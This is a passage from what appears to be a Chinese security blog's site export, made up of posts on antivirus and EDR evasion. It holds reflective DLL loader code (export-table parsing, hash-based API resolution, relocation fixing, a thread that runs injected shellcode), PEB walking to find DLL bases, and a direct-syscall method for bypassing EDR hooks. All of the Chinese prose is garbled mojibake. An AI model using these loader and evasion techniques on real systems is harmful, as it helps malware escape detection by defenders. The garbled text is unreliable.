Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of name pointers</span><br>uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of addresses</span><br>uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of name ordinals</span><br>uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress);<br><br><span class="hljs-comment">// get a counter for the number of exported functions...</span><br>dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;<br><br><span class="hljs-comment">// loop through all the exported functions to find the ReflectiveLoader</span><br><span class="hljs-keyword">while</span> (dwCounter--)<br>&#123;<br><span class="hljs-keyword">char</span>* cpExportedFunctionName = (<span class="hljs-keyword">char</span>*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(cpExportedFunctionName, REFLDR_NAME) != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">// get the File Offset for the array of addresses</span><br>uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress);<br><br><span class="hljs-comment">// use the functions name ordinal as an index into the array of name pointers</span><br>uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="hljs-keyword">sizeof</span>(DWORD));<br><br><span class="hljs-comment">// return the File Offset to the ReflectiveLoader() functions code...</span><br><span class="hljs-keyword">return</span> Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);<br>&#125;<br><span class="hljs-comment">// get the next exported function name</span><br>uiNameArray += <span class="hljs-keyword">sizeof</span>(DWORD);<br><br><span class="hljs-comment">// get the next exported function name ordinal</span><br>uiNameOrdinals += <span class="hljs-keyword">sizeof</span>(WORD);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¡ç®—å‡ºreflective loaderçš„åç§»<br>å…¶ä¸­åœ¨<code>while (dwCounter--)</code>å¾ªç¯ä¸­éå†å¯¼å‡ºè¡¨ï¼Œæ ¹æ®å‡½æ•°åæ‰¾åˆ°<code>bootloader</code>å‡½æ•°ï¼Œæ¥è·å¾—å‡½æ•°çš„åç§»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">th = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)((ULONG_PTR)exec_mem + RefLdrOffset), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>åˆ›å»ºçº¿ç¨‹è°ƒç”¨<code>ReflectLoader</code>å‡½æ•°</p><h3 id="dllå¤„ç†"><a href="#dllå¤„ç†" class="headerlink" title="dllå¤„ç†"></a>dllå¤„ç†</h3><p>åœ¨<code>ReflectiveLoader</code>ä¸­ï¼Œä¸»è¦åšäº†å¦‚ä¸‹å·¥ä½œ</p><ol><li>è§£æåŠ è½½DLLæ‰€éœ€kernel32.dll WINAPIçš„åœ°å€(ä¾‹å¦‚VirtualAlloc, LoadLibraryAç­‰),é€šè¿‡hashéå†å†…å­˜æœç´¢<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (usCounter &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">// compute the hash values for this function name</span><br>dwHashValue = hash((<span class="hljs-keyword">char</span>*)(uiBaseAddress + DEREF_32(uiNameArray)));<br><br><span class="hljs-comment">// if we have found a function we want we get its virtual address</span><br><span class="hljs-keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH)<br>&#123;<br><span class="hljs-comment">// get the VA for the array of addresses</span><br>uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions);<br><br><span class="hljs-comment">// use this functions name ordinal as an index into the array of name pointers</span><br>uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="hljs-keyword">sizeof</span>(DWORD));<br><br><span class="hljs-comment">// store this functions VA</span><br><span class="hljs-keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH)<br>pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwHashValue == GETPROCADDRESS_HASH)<br>pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwHashValue == VIRTUALALLOC_HASH)<br>pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));<br><br><span class="hljs-comment">// decrement our counter</span><br>usCounter--;<br>&#125;<br><br><span class="hljs-comment">// get the next exported function name</span><br>uiNameArray += <span class="hljs-keyword">sizeof</span>(DWORD);<br><br><span class="hljs-comment">// get the next exported function name ordinal</span><br>uiNameOrdinals += <span class="hljs-keyword">sizeof</span>(WORD);<br>&#125;<br></code></pre></td></tr></table></figure></li><li>å°†dllä¸å…¶ç›¸å¯¹åº”çš„éƒ¨åˆ†å†™å…¥å†…å­˜<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (uiValueA--)<br>*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;<br><br><span class="hljs-comment">// STEP 3: load in all of our sections...</span><br><br><span class="hljs-comment">// uiValueA = the VA of the first section</span><br>uiValueA = ((ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.SizeOfOptionalHeader);<br><br><span class="hljs-comment">// itterate through all sections, loading them into memory.</span><br>uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;<br></code></pre></td></tr></table></figure></li><li>å»ºç«‹DLLå¯¼å…¥è¡¨ï¼Œä»¥ä¾¿DLLå¯ä»¥è°ƒç”¨ntdll.dllå’Œkernel32.dll WINAPI<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// patch in the address for this imported function</span><br>DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));<br></code></pre></td></tr></table></figure></li><li>ä¿®å¤é‡å®šä½è¡¨<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock)<br>&#123;<br><span class="hljs-comment">// uiValueA = the VA for this relocation block</span><br>uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress);<br><br><span class="hljs-comment">// uiValueB = number of entries in this relocation block</span><br>uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(IMAGE_RELOC);<br><br><span class="hljs-comment">// uiValueD is now the first entry in the current relocation block</span><br>uiValueD = uiValueC + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION);<br><br><span class="hljs-comment">// we itterate through all the entries in the current block...</span><br><span class="hljs-keyword">while</span> (uiValueB--)<br>&#123;<br><span class="hljs-comment">// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.</span><br><span class="hljs-comment">// we dont use a switch statement to avoid the compiler building a jump table</span><br><span class="hljs-comment">// which would not be very position independent!</span><br><span class="hljs-keyword">if</span> (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_DIR64)<br>*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += uiLibraryAddress;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGHLOW)<br>*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += (DWORD)uiLibraryAddress;<br></code></pre></td></tr></table></figure></li><li>è°ƒç”¨DLLçš„å…¥å£ç‚¹<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// if we are injecting an DLL via a stub we call DllMain with no parameter</span><br>((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>æœ€ç»ˆshellcodeä½äºdllmainä¸­</li></ol><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://xz.aliyun.com/t/11659">https://xz.aliyun.com/t/11659</a><br><a href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a><br><a href="https://github.com/mgeeky/ThreadStackSpoofer">https://github.com/mgeeky/ThreadStackSpoofer</a></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·å–DLLåŸºå€</title>
      <link href="2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/"/>
      <url>2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="windbgæŸ¥çœ‹dllåŸºå€"><a href="#windbgæŸ¥çœ‹dllåŸºå€" class="headerlink" title="windbgæŸ¥çœ‹dllåŸºå€"></a>windbgæŸ¥çœ‹dllåŸºå€</h1><p>fså¯„å­˜å™¨ -&gt; TEB -&gt; PEB -&gt; PEB_LDR_DATA -&gt; LIST_ENTRY -&gt; LDR_DATA_TABLE_ENTRY -&gt; dll_base</p><a id="more"></a><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>é¦–å…ˆå†™ä¸€ä¸ªç®€å•çš„syscallçš„ä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;winternl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll&quot;</span>)</span><br><br><span class="hljs-function">EXTERN_C NTSTATUS <span class="hljs-title">SysNtCreateFile</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">PHANDLE FileHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER AllocationSize,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG FileAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG ShareAccess,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG CreateDisposition,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG CreateOptions,</span></span><br><span class="hljs-function"><span class="hljs-params">PVOID EaBuffer,</span></span><br><span class="hljs-function"><span class="hljs-params">ULONG EaLength)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>FARPROC addr = GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>), <span class="hljs-string">&quot;NtCreateFile&quot;</span>);<br><br>OBJECT_ATTRIBUTES oa;<br>HANDLE fileHandle = <span class="hljs-literal">NULL</span>;<br>NTSTATUS status = <span class="hljs-literal">NULL</span>;<br>UNICODE_STRING fileName;<br>IO_STATUS_BLOCK osb;<br><br>RtlInitUnicodeString(&amp;fileName, (PCWSTR)<span class="hljs-string">L&quot;\\??\\c:\\temp\\test.txt&quot;</span>);<br>ZeroMemory(&amp;osb, <span class="hljs-keyword">sizeof</span>(IO_STATUS_BLOCK));<br>InitializeObjectAttributes(&amp;oa, &amp;fileName, OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>SysNtCreateFile(<br>&amp;fileHandle,<br>FILE_GENERIC_WRITE,<br>&amp;oa,<br>&amp;osb,<br><span class="hljs-number">0</span>,<br>FILE_ATTRIBUTE_NORMAL,<br>FILE_SHARE_WRITE,<br>FILE_OVERWRITE_IF,<br>FILE_SYNCHRONOUS_IO_NONALERT,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ç”Ÿæˆexeæ–‡ä»¶ï¼Œç„¶åä¸¢è¿›windbgé‡Œé¢è¿›è¡Œè°ƒè¯•<br>windbgå¸¸ç”¨çš„å‡ ä¸ªæŒ‡ä»¤</p><ol><li>bpï¼ˆbreakpointï¼‰</li><li>gï¼ˆgotoï¼‰</li><li>dtï¼ˆdump using type informationï¼‰</li><li>dvï¼ˆdump local variablesï¼‰</li><li>kï¼ˆstacktraceï¼‰</li></ol><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸‹TEBçš„æ•°æ®ç»“æ„<code>dt _TEB</code><br><img src="https://s2.loli.net/2022/11/12/o9g5R3rYb7ctkBs.png" alt="TEBæ•°æ®ç»“æ„"><br>å¯ä»¥å‘ç°åœ¨0x060çš„åç§»å¤„å­˜æ”¾çš„æ˜¯è¿›ç¨‹ç¯å¢ƒå—PEBçš„æŒ‡é’ˆ</p><p>æ¥ç€æˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œæ’å¡PEBçš„æ•°æ®ç»“æ„<code>dt _PEB</code><br><img src="https://s2.loli.net/2022/11/12/gf8hqV5Oi7beAE9.png" alt="PEBæ•°æ®ç»“æ„"><br>å¯ä»¥çœ‹åˆ°0x018çš„åç§»å¤„å­˜æ”¾çš„æ˜¯PEB_LDR_DATAç»“æ„ä½“çš„æŒ‡é’ˆ</p><p>ç»§ç»­è·Ÿè¿›PEB_LDR_DATAæ•°æ®ç»“æ„<br><img src="https://s2.loli.net/2022/11/12/YgBw5z72tTyibfa.png" alt="PEB_LDR_DATAæ•°æ®ç»“æ„"><br>å¯ä»¥çœ‹åˆ°åœ¨0x020çš„åç§»å‡ºå­˜æ”¾çš„æ˜¯_LIST_ENTRYæŒ‡é’ˆ<br>æ ¹æ®å…¶åå­—å˜é‡å<code>InMemoryOrderModuleList</code>å¯ä»¥çœ‹å‡ºæ˜¯æŒ‰ç…§å†…å­˜ä¸­é¡ºåºçš„æ¨¡å—é“¾è¡¨</p><p>ç»§ç»­è·Ÿè¿›å°±èƒ½çœ‹åˆ°è¯¥<code>_LIST_ENTRY</code>ä¸ºåŒå‘é“¾è¡¨<br><img src="https://s2.loli.net/2022/11/12/zL6bA2oT34i1VEp.png" alt="LIST_ENTRY"><br>æ—¢ç„¶æ˜¯åŒå‘é“¾è¡¨ï¼Œé‚£è‚¯å®šç»§ç»­æŒ‡å‡ºäº†ä¸‹ä¸€æ­¥çš„æŒ‡é’ˆï¼Œä½†è¿™é‡Œæ— æ³•æ˜ç¡®çš„çœ‹å‡ºï¼Œæˆ‘ä»¬éœ€è¦å»MSDNè¿›è¡ŒæŸ¥è¯¢</p><p>é€šè¿‡æŸ¥è¯¢<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">MSDN</a><br>å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå¯¹åº”çš„æ˜¯<code>LDR_DATA_TABLE_ENTRY</code>è¿™ä¸ªç»“æ„ä½“</p><p>é‚£æˆ‘ä»¬ç»§ç»­è·Ÿè¿›è¿™ä¸ªç»“æ„ä½“<code>dt _LDR_DATA_TABLE_ENTRY</code>ï¼Œä¹Ÿå°±æ˜¯è¯¥é“¾è¡¨å®é™…æŒ‡å‘çš„å†…å®¹<br><img src="https://s2.loli.net/2022/11/12/zL6bA2oT34i1VEp.png" alt="LDR_DATA_TABLE_ENTRY"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œåç§»0x018çš„ä½ç½®ï¼Œå­˜æ”¾çš„å°±æ˜¯DLLåŸºåœ°å€ï¼ŒåŒæ—¶è¿˜å­˜æœ‰FullDllNameå’ŒBaseDllNameå¯ä»¥å¸®åŠ©æˆ‘ä»¬åŒºåˆ†æ˜¯å“ªä¸ªDLL</p><h2 id="ä»£ç éå†æ¨¡å—é“¾è¡¨"><a href="#ä»£ç éå†æ¨¡å—é“¾è¡¨" class="headerlink" title="ä»£ç éå†æ¨¡å—é“¾è¡¨"></a>ä»£ç éå†æ¨¡å—é“¾è¡¨</h2><p>æ¨¡å—é“¾è¡¨æ˜¯ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä»¥ä¸‹ä»¥éå†InLoadOrderModuleListä¸¾ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span></span><br><span class="hljs-class">&#123;</span><br>_LIST_ENTRY* Flink;<br>_LIST_ENTRY* Blink;<br>&#125;_LIST_ENTRY;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">UNICODE_STRING</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> Length;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> MaximumLength;<br><span class="hljs-keyword">wchar_t</span>* Buffer;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span>* pPEB = <span class="hljs-literal">NULL</span>;<br><br>__asm<br>&#123;<br>push eax<br>mov eax,fs:[<span class="hljs-number">0x30</span>]<br>mov pPEB,eax<br>pop eax<br>&#125;<br><br><span class="hljs-keyword">int</span>* pIDR = (<span class="hljs-keyword">int</span>*)(*(pPEB + <span class="hljs-number">0x03</span>)); <span class="hljs-comment">//0x03 * 4 = 0x0c</span><br><br>_LIST_ENTRY* pInLoadOrderModuleList = (_LIST_ENTRY*)(pIDR + <span class="hljs-number">0x03</span>); <span class="hljs-comment">//0x03 * 4 = 0x0c</span><br><br>_LIST_ENTRY* pHead, *p;<br>p = pHead = pInLoadOrderModuleList-&gt;Flink;<br><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: &quot;</span>, count++);<br>_UNICODE_STRING* pBaseName = (_UNICODE_STRING*)(((<span class="hljs-keyword">int</span>)p) + <span class="hljs-number">0x2c</span>);<br><span class="hljs-keyword">if</span> (pBaseName-&gt;Buffer)<br>wprintf(<span class="hljs-string">L&quot;%s &quot;</span>, pBaseName-&gt;Buffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, *((<span class="hljs-keyword">int</span>*)(((<span class="hljs-keyword">int</span>)p) + <span class="hljs-number">0x18</span>)));<br><span class="hljs-comment">//</span><br>p = p-&gt;Flink;<br>&#125; <span class="hljs-keyword">while</span> (p != pHead);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å‰ç½®çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€</title>
      <link href="2022/11/12/%E8%A7%84%E9%81%BF%E2%80%9C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%A0%87%E8%AE%B0%E2%80%9D/"/>
      <url>2022/11/12/%E8%A7%84%E9%81%BF%E2%80%9C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%A0%87%E8%AE%B0%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€"><a href="#è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€" class="headerlink" title="è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€"></a>è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€</h1><p>è§„é¿å¸¸è§çš„æ¶æ„APIè°ƒç”¨æ¨¡å¼åŠä½¿ç”¨ç›´æ¥ç³»ç»Ÿè°ƒç”¨å¹¶è§„é¿â€œç³»ç»Ÿè°ƒç”¨æ ‡è®°â€ï¼Œæ¥bypass edr</p><a id="more"></a><h2 id="ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨"><a href="#ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨"></a>ç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨</h2><p>åœ¨ç”¨æˆ·æ€è¿è¡Œçš„ç³»ç»Ÿè¦æ§åˆ¶ç³»ç»Ÿæ—¶ï¼Œæˆ–è€…è¦è¿è¡Œç³»ç»Ÿä»£ç å°±å¿…é¡»å–å¾—R0æƒé™ã€‚ç”¨æˆ·ä»R3åˆ°R0éœ€è¦å€ŸåŠ©ntdll.dllä¸­çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åˆ†åˆ«ä»¥â€œNtâ€å’Œâ€œZwâ€å¼€å¤´ï¼Œè¿™ç§å‡½æ•°å«åšNative APIï¼Œä¸‹å›¾æ˜¯è°ƒç”¨è¿‡ç¨‹ï¼š<br><img src="https://s2.loli.net/2022/11/12/Nwn5hHyOCR8pEDe.png"><br>è¿™äº›ntå¼€å¤´çš„å‡½æ•°ä¸€èˆ¬æ²¡æœ‰å®˜æ–¹æ–‡æ¡£ï¼Œå¾ˆå¤šéƒ½æ˜¯è¢«é€†å‘æˆ–è€…æ³„éœ²windowsæºç çš„æ–¹å¼æµå‡ºçš„ã€‚</p><p><code>FARPROC addr = GetProcAddress(LoadLibraryA(&quot;ntdll&quot;), &quot;NtCreateFile&quot;);</code><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å†…å­˜ä¸­æ‰¾åˆ°å‡½æ•°çš„é¦–åœ°å€æ¥è°ƒç”¨è¿™äº›ntå¼€å¤´çš„å‡½æ•°</p><p>åœ¨åç¼–è¯‘syscallå‡½æ•°ä¹‹åï¼Œå¯ä»¥å¾—åˆ°ä¸€æ®µéå¸¸å…·æœ‰ç‰¹å¾çš„æ±‡ç¼–æŒ‡ä»¤</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10</span>,rcx<br><span class="hljs-keyword">mov</span>     eax,xxh<br><span class="hljs-symbol">syscall</span><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·è°ƒç”¨windows api ReadFileï¼Œæœ‰äº›edrä¼šhook ReadFileè¿™ä¸ªwindows apiï¼Œä½†å®é™…ä¸Šæœ€ç»ˆä¼šè°ƒç”¨åˆ°NTxxxè¿™ç§å‡½æ•°ã€‚æœ‰äº›å‡½æ•°æ²¡æœ‰è¢«edr hookå°±å¯ä»¥ç»•è¿‡ã€‚è¯´ç™½äº†è¿˜æ˜¯é€šè¿‡é»‘åå•æœºåˆ¶çš„ä¸€ç§ç»•è¿‡ã€‚æ‰¾åˆ°å†·é—¨çš„wdinwos apiå¹¶æ‰¾åˆ°å¯¹åº”çš„åº•å±‚å†…æ ¸api</p><p>è¿™é‡Œæœ‰ä¸ªå¾ˆå¥½çš„ç½‘ç«™<a href="https://j00ru.vexillium.org/syscalls/nt/64/">sycallç³»ç»Ÿè°ƒç”¨å·æ–‡æ¡£</a><br>å› ä¸ºsyscallåœ¨è¿™é‡Œå­˜å‚¨çš„æ˜¯ç³»ç»Ÿè°ƒç”¨å·</p><p>æˆ‘ä»¬å¯ä»¥åœ¨visual studioä¸­ç›´æ¥åç¼–è¯‘æŸ¥çœ‹æ±‡ç¼–ä»£ç ä¸å­—èŠ‚ç 